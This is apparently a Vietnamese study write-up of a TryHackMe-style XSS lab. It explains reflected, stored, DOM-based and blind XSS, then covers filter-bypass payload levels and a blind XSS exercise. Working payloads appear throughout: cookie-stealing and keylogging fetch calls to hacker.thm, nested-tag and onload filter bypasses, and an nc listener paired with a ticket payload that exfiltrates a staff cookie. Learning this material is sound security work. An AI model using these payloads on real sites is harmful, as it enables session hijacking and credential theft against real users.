# Intro to Cross-site Scripting

***Proof Of Concept (POC)***:

- Mục đích: Chứng minh rằng một lỗ hổng XSS (Cross-Site Scripting) tồn tại trên website.

- Cách thực hiện: Sử dụng một đoạn mã JavaScript đơn giản để hiển thị một hộp thông báo (alert box) trên trang web.

- Ví dụ: 
    
        <script>alert(‘XSS’);</script>

***Session Stealings:***

- Mục đích: Đánh cắp thông tin phiên làm việc (session) của người dùng, chẳng hạn như token đăng nhập, thường được lưu trữ trong cookie.

- Cách thực hiện: Sử dụng JavaScript để lấy cookie, mã hóa nó (bằng Base64), và gửi đến một website do hacker kiểm soát.

- Ví dụ:

        <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
    
***Key Logger (Trình ghi phím)***

- Mục đích: Ghi lại mọi thứ người dùng nhập trên website (ví dụ: mật khẩu, thông tin thẻ tín dụng) và gửi đến hacker.

- Cách thực hiện: Sử dụng JavaScript để theo dõi sự kiện nhấn phím và gửi dữ liệu đến website của hacker. 

- Ví dụ:

        <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>

***Business Logic***

- Mục đích: Khai thác các chức năng nghiệp vụ cụ thể của website, chẳng hạn như thay đổi thông tin người dùng.

- Cách thực hiện: Sử dụng JavaScript để gọi các hàm nghiệp vụ của website, ví dụ như thay đổi email của người dùng.

- Ví dụ:

        <script>user.changeEmail('attacker@hacker.thm');</script>

***Reflected XSS***

Ví dụ kịch bản như sau: 

1 website mà khi nhập thông tin sai, 1 error message sẽ được hiển thị. Nội dung của error message được lấy từ tham số ***error*** trong Query String và được tích hợp trực tiếp vào Page Source:

![img](104)

Web Application không check nội dung của tham số ***error***, điều này cho phép attacker chèn mã độc vào:

![img](105)

![img](106)

Cách kiểm tra ***Reflected XSS***:

=> Kiểm tra tất cả point of entry có thể, bao gồm: 

- Tham số trên URL Query String

- URL file path

- Đôi khi là HTTP headers (thực tế thì khó khai thác)

***Stored XSS***

***XSS payload*** sẽ được lưu trữ trên Web Application (vd: trong Database) và sau đó được chạy khi User khác truy cập Web page.

Ví dụ kịch bản:

1 Blog website cho phép User gửi bình luận. Không may, những bình luận này không được kiểm tra xem có chứa mã JavaScript hay lọc ra bất kỳ mã độc nào không. Nếu gửi 1 bình luận có chứa mã JavaScript, nó sẽ được lưu trong DB và User khác hiện đang truy cập bài viết chứa bình luận này sẽ chạy mã JavaScript trên Browser của họ.

![img](107)

Cách kiểm tra ***Stored XSS***: 

=> Cần kiểm tra mọi Point of entry có thể có, nơi nhìn có vẻ như là nơi lưu trữ và sau đó hiển thị lại ở những khu vực mà User khác có quyền truy cập; một số ví dụ những khu vực có vẻ là nơi lưu trữ:

- Comment on a blog

- User profile information

- Website Listings

***DOM Based XSS***

=> ***DOM là gì?***

- ***DOM (Document Object Model)*** là một giao diện lập trình cho các tài liệu HTML và XML.

- ***Nó làm gì?***: DOM biểu diễn một trang web dưới dạng một cấu trúc dữ liệu, cho phép các chương trình (như JavaScript) thay đổi cấu trúc, nội dung và giao diện của trang web.

- ***Ví dụ***: Một trang web là một tài liệu HTML, và DOM giúp trình duyệt hiểu và hiển thị tài liệu đó. Có thể xem DOM như ***một bản đồ*** của trang web, giúp JavaScript "điều khiển" trang web dễ dàng hơn.

![img](108)

***Khai thác DOM (DOM-Based XSS)***

- ***DOM-Based XSS*** là một loại tấn công mà mã độc JavaScript được thực thi trực tiếp trong trình duyệt mà không cần tải lại trang hoặc gửi dữ liệu đến máy chủ (backend).

- ***Nguyên nhân***: Lỗ hổng xảy ra khi website sử dụng dữ liệu đầu vào từ người dùng (ví dụ: URL, form nhập liệu) mà không kiểm tra hoặc làm sạch dữ liệu đó trước khi đưa vào DOM.

***Ví dụ kịch bản tấn công***

=> Cách hoạt động:

- Website sử dụng JavaScript để lấy nội dung từ tham số ***window.location.hash*** (phần sau dấu ***#*** trong URL).

- Nội dung này được hiển thị trực tiếp lên trang web mà không được kiểm tra xem có chứa mã độc hay không.

- Attacker có thể chèn mã JavaScript độc hại vào phần hash của URL, và mã này sẽ được thực thi khi trang web hiển thị nội dung.

=> Ví dụ:

URL: 

    https://example.com/page#<script>alert('XSS');</script>

Nếu website không kiểm tra nội dung sau dấu #, đoạn mã           
    
    <script>alert('XSS');</script> 

sẽ được thực thi, hiển thị một hộp thông báo "XSS".

=> Cách kiểm tra ***DOM-based XSS***:

DOM-Based XSS khó kiểm tra vì nó xảy ra hoàn toàn trên trình duyệt. Cách tìm lỗ hổng:

- Tìm các biến mà kẻ tấn công có thể kiểm soát (ví dụ: ***window.location.x***).

- Kiểm tra cách dữ liệu được xử lý: có ghi vào DOM hoặc sử dụng các hàm không an toàn như ***eval()*** không.

***Blind XSS***

Blind XSS tương tự như Stored XSS, trong đó Payload được lưu trữ trên Website để User khác xem, nhưng trong trường hợp này, ***không thể thấy Payload***.

=> Ví dụ kịch bản: 

1 website có 1 Contact Form, nơi có thể gửi tin nhắn cho nhân viên. Nội dung tin nhắn không được check xem có mã độc không, điều này cho phép attacker nhập bất cứ thứ gì. Những tin nhắn này sau đó chuyển thành Support Tickets mà nhân viên xem trên 1 cổng Web riêng tư.

Khi sử dụng đúng Payload, JavaScript của attacker có thể thực hiện lệnh gọi trở lại website của attacker, tiết lộ URL cổng thông tin của nhân viên, Cookie của nhân viên và thậm chí cả nội dung của page cổng thông tin. Giờ đây, attacker có thể chiếm quyền điều khiển Session của nhân viên và có quyền truy cập vào cổng riêng này. 

=> Cách kiểm tra Blind XSS: 

Blind XSS là một loại tấn công XSS không thể thấy kết quả ngay lập tức (ví dụ: không có hộp thông báo hiện lên). Thay vào đó, cần một cách để biết liệu mã độc có được thực thi hay không.

=> Sử dụng ***Payload có callback***: Payload này sẽ gửi một yêu cầu HTTP (ví dụ: đến một server do bạn kiểm soát) khi nó được thực thi. Nhờ callback, có thể biết được:

- Mã độc có được thực thi không?

- Khi nào nó được thực thi?

=> Sử dụng công cụ kiểm tra Blind XSS như ***XSS Hunter Express***. Nó tự động thu thập thông tin khi Payload được thực thi, bao gồm:

- Cookie của người dùng.

- URL của trang web.

- Nội dung của trang web.

**Perfecting your payload***

***Level1***:

=> Form nhập tên: 

![imt](109)

=> Chèn payload: 

    <script>alert(‘THM’);</script> 

vào ô nhập tên để sang Level2:

![img](110)

***Level2***:

![img](111)

=> Tên được hiển thị ở 1 ***< input>*** khác:

![img](112)

=> Để chèn mã vào ô nhập tên, cần thêm ***“>*** để nối tiếp. Nếu chỉ dùng payload:

    <script>alert(‘THM’);</script>

![img](113)

Thay vào đó, chèn payload:

    “><script>alert(‘THM’);</script>

![img](114)

***Level3***:

![img](115)

=> Lần này tên được hiển thị trong thẻ ***< textarea>***

=> Thay vì chèn payload: 

    <script>alert(‘THM’);</script>

![img](116)

Chèn payload sau để bypass ***< textarre>***: 

    </textarea><script>alert('THM');</script>

![img](117)

***Level4***

Lần này sau khi nhập tên vào field, sẽ được hiển thị như sau: 

![img](118)

![img](119)

=> Chèn payload : ***';alert('THM');//***:

![img](120)

![img](121)

Dấu ***‘*** sẽ đóng field xác định tên, sau đó dấu ***;*** thông báo kết thúc câu lệnh hiện tại và dấu ***//*** khiến những thứ đằng sau trở thành comment.

***Level5***:

![img](122)

![img](123)

=> Thử chèn payload vào ô nhập tên: 
    
    <script>alert(‘THM’);</script>

![img](124)

![img](125)

=> Server có filter loại bỏ mọi từ có khả năng nguy hiểm!.

Để bypass, có thể thử cách sau: 

![img](126)

=> Chèn payload: 

    <sscriptcript>alert('THM');</sscriptcript>

![img](127)

***Level6***:

![img](128)

=> Thử chèn payload: 

    “><script>alert(‘THM’);</script>

![img](129)

=> Dấu ***<*** và ***>*** bị lọc khỏi payload, ngăn việc thoát khỏi thẻ ***< img>***.

=> Tận dụng các thuộc tính của <img>, như ***onload***. Onload sẽ thực thi mã sau khi hình ảnh được chỉ định trong src tải lên web.

=> Thử chèn payload: ***/images/cat.jpg" onload="alert('THM');***: 

![img](130)

***Practical Example (Blind XSS)***

![img](131)

=> Xem source page và thấy phần Ticket Contents sử dụng thẻ ***< textarea>***:

![img](132)

=> Thử tạo vé mới với Ticket Contents như sau: 

![img](133)

![img](134)

=> Thoát được ra khỏi thẻ ***< textarea>***.

=> Tiếp tục thử tạo Ticket mới với nội dung:

    </textarea><script>alert('THM');</script>

![img](135)

=> Thành công, khi click vào xem vé sẽ có thông báo ***alert()***: 

![img](136)

Một số thông tin hữu ích từ User là ***Cookie*** của họ, có thể dùng Cookie này để leo thang đặc quyền, bằng cách chiếm quyền điều khiển đăng nhập của họ. Để thực hiện, Payload cần phải trích xuất được Cookie của User, chuyển nó sang Web Server khác.

=> Thiết lập 1 Server lắng nghe để nhận thông tin:

Sử dụng tool ***NetCat***, nếu muốn nghe trên cổng 9001, dùng lệnh:
	    
    nc -l -p 9001

Tùy chọn ***-l*** cho biết sử dụng NetCat ở chế độ ***Listen***, tùy chọn ***-p*** cho biết số Port. Để tránh việc phân giải tên Server qua DNS, có thể thêm tùy chọn ***-n***; ngoài ra, để phát hiện lỗi, nên chạy NetCat ở chế độ đầy đủ hơn với tùy chọn ***-v***:

=> Lệnh cuối cùng là 
	
    nc -n -l -v -p 9001

Có thể viết là 
	
    nc -nlvp 9001

![img](137)

=> Tạo vé mới với nội dung: 

    </textarea><script>fetch(‘http://URL_OR_IP:PORT_NUMBER?cookie=’ + btoa(document.cookie) );</script>

- ***fetch()***: câu lệnh tạo HTTP request

- ***URL_OR_IP***: địa chỉ IP 

- ***PORT_NUMBER***: số cổng

- ***?cookie=***: là query string chứa cookie của nạn nhân

- ***btoa()***: mã hóa cookie của nạn nhân dưới dạng base64

- ***document.cookie***: truy cập Cookie của nạn nhân

![img](138)

=> Sau khi chờ đợi đây là những gì thu được từ NetCat: 

![img](139)

=> Giải mã cookie: 

![img](140)

=> Tìm được staff-session!


















